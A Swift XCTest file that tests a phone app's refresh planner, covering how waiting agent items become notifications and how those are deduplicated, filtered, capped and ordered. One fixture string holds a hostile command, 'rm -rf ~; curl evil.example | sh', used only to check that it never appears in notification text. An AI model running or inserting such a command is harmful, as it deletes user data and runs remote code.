import CapstanKit
import Foundation
import XCTest
@testable import CapstanPhoneCore

final class RefreshPlannerTests: XCTestCase {
    private let hostId = UUID(uuidString: "A1A1A1A1-0000-4000-8000-000000000001")!
    private let hostile = "SECRET rm -rf ~; curl evil.example | sh"

    private func text(_ raw: String) -> String {
        let escaped = raw.replacingOccurrences(of: "\\", with: "\\\\").replacingOccurrences(of: "\"", with: "\\\"")
        return "{\"raw\":\"\(escaped)\",\"verified\":true,\"truncated\":false}"
    }

    private func waiting(_ key: String, kind: String, since: String = "2026-10-29T08:00:00Z") -> String {
        "\"\(key)\":{\"key\":\"\(key)\",\"requestId\":\"req-\(key)\",\"kind\":\"\(kind)\",\"since\":\"\(since)\","
            + "\"summary\":\(text(hostile)),\"contentHash\":\"aaaaaaaaaaaa\",\"needsTerminal\":false}"
    }

    private func project(_ id: String, availability: String = "ready", complete: Bool = true, waiting: [String]) -> String {
        "\"\(id)\":{\"projectId\":\"\(id)\",\"root\":\"/work/\(id)\",\"availability\":\"\(availability)\",\"epoch\":\"e1\","
            + "\"head\":4,\"waiting\":{\(waiting.joined(separator: ","))},\"agents\":{},\"plans\":{},\"run\":null,"
            + "\"details\":{},\"attention\":{},\"snapshotComplete\":\(complete),\"staleSince\":null}"
    }

    private func model(_ projects: [String]) throws -> HostModel {
        let json = "{\"hostId\":\"\(hostId.uuidString)\",\"hello\":null,\"projects\":{\(projects.joined(separator: ","))},"
            + "\"cursor\":null,\"forwards\":{}}"
        return try JSONDecoder().decode(HostModel.self, from: Data(json.utf8))
    }

    func testFirstPassIsTheBaseline() throws {
        let m = try model([project("alpha", waiting: [waiting("w1", kind: "op"), waiting("w2", kind: "prompt")])])
        let pass = RefreshPlanner.pass(models: [m], seen: nil, settings: PhoneSettings())
        XCTAssertTrue(pass.notifications.isEmpty, "nothing is announced the first time")
        XCTAssertEqual(pass.seen.count, 2)
    }

    func testOnlyNewItemsAreAnnouncedOnce() throws {
        let before = try model([project("alpha", waiting: [waiting("w1", kind: "op")])])
        let first = RefreshPlanner.pass(models: [before], seen: nil, settings: PhoneSettings())
        let after = try model([project("alpha", waiting: [waiting("w1", kind: "op"), waiting("w2", kind: "prompt")])])
        let second = RefreshPlanner.pass(models: [after], seen: first.seen, settings: PhoneSettings())
        XCTAssertEqual(second.notifications.count, 1)
        XCTAssertEqual(second.notifications.first?.title, "Permission prompt waiting")
        XCTAssertEqual(second.notifications.first?.body, "alpha")
        let third = RefreshPlanner.pass(models: [after], seen: second.seen, settings: PhoneSettings())
        XCTAssertTrue(third.notifications.isEmpty, "deduplicated by request id")
    }

    func testHostileTextNeverInANotification() throws {
        let m = try model([project("alpha", waiting: [waiting("w1", kind: "op"), waiting("w2", kind: "message")])])
        let pass = RefreshPlanner.pass(models: [m], seen: [], settings: PhoneSettings())
        XCTAssertEqual(pass.notifications.count, 2)
        for plan in pass.notifications {
            let all = [plan.title, plan.body, plan.identifier, plan.category, plan.threadIdentifier, plan.deepLink ?? ""]
            for field in all {
                for secret in ["SECRET", "rm -rf", "curl", "evil"] {
                    XCTAssertFalse(field.contains(secret), "\(secret) in \(field)")
                }
            }
        }
    }

    func testKindsSwitchedOffAndProjectsNotReadyAreLeftOut() throws {
        var settings = PhoneSettings()
        settings.notifyKinds = [.prompt]
        let m = try model([
            project("alpha", waiting: [waiting("w1", kind: "op"), waiting("w2", kind: "prompt")]),
            project("beta", availability: "silent", waiting: [waiting("w3", kind: "prompt")]),
        ])
        let pass = RefreshPlanner.pass(models: [m], seen: [], settings: settings)
        XCTAssertEqual(pass.notifications.map(\.title), ["Permission prompt waiting"])
        XCTAssertFalse(pass.seen.contains { $0.contains("beta") }, "a silent project is not remembered either")
    }

    func testCapAndOrder() throws {
        let items = (0..<12).map { waiting("w\($0)", kind: "op", since: String(format: "2026-10-29T08:%02d:00Z", 59 - $0)) }
        let pass = RefreshPlanner.pass(models: [try model([project("alpha", waiting: items)])], seen: [], settings: PhoneSettings())
        XCTAssertEqual(pass.notifications.count, RefreshPlanner.notificationCap)
        XCTAssertTrue(pass.notifications.first?.identifier.hasSuffix(".w11") ?? false, "oldest first")
        XCTAssertEqual(pass.seen.count, 12, "every item is remembered, announced or not")
    }

    func testBudgetAndCompleteness() throws {
        let start = Date(timeIntervalSince1970: 0)
        XCTAssertFalse(RefreshPlanner.shouldStop(started: start, now: start.addingTimeInterval(24), complete: false))
        XCTAssertTrue(RefreshPlanner.shouldStop(started: start, now: start.addingTimeInterval(25), complete: false))
        XCTAssertTrue(RefreshPlanner.shouldStop(started: start, now: start.addingTimeInterval(1), complete: true))
        XCTAssertFalse(RefreshPlanner.isComplete(nil))
        XCTAssertTrue(RefreshPlanner.isComplete(try model([project("a", waiting: []), project("b", availability: "gone", complete: false, waiting: [])])))
        XCTAssertFalse(RefreshPlanner.isComplete(try model([project("a", complete: false, waiting: [])])))
    }

    func testHostsSkipDisabledAndBlocked() throws {
        func config(_ id: UUID, enabled: Bool) throws -> HostConfig {
            try JSONDecoder().decode(HostConfig.self, from: Data(
                ("{\"id\":\"\(id.uuidString)\",\"displayName\":\"h\",\"destination\":\"capstan-x\",\"cstanPath\":\"cstan\","
                    + "\"extraRoots\":[],\"pollMs\":2000,\"identityFile\":null,\"enabled\":\(enabled)}").utf8))
        }
        let a = UUID(), b = UUID(), c = UUID()
        let hosts = [try config(a, enabled: true), try config(b, enabled: false), try config(c, enabled: true)]
        XCTAssertEqual(RefreshPlanner.hosts(hosts, blocked: [c]), [a])
    }

    func testSeenStoreRoundTrip() throws {
        let directory = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        defer { try? FileManager.default.removeItem(at: directory) }
        let store = SeenStore(directory: directory)
        XCTAssertNil(store.read())
        try store.write(["a", "b"])
        XCTAssertEqual(store.read(), ["a", "b"])
    }

    func testThePlannerHasNoGateAndNoDecider() throws {
        // The rule of the plan: a refresh never asks for Face ID and never decides. The source names neither type.
        let file = URL(fileURLWithPath: #filePath)
            .deletingLastPathComponent().deletingLastPathComponent().deletingLastPathComponent().deletingLastPathComponent()
            .appendingPathComponent("Sources/CapstanPhoneCore/Refresh/RefreshPlanner.swift")
        let source = try String(contentsOf: file, encoding: .utf8)
        let code = source.split(separator: "\n").filter { !$0.trimmingCharacters(in: .whitespaces).hasPrefix("///") }
            .joined(separator: "\n")
        XCTAssertFalse(code.contains("BiometricGate"))
        XCTAssertFalse(code.contains("Decider"))
    }
}
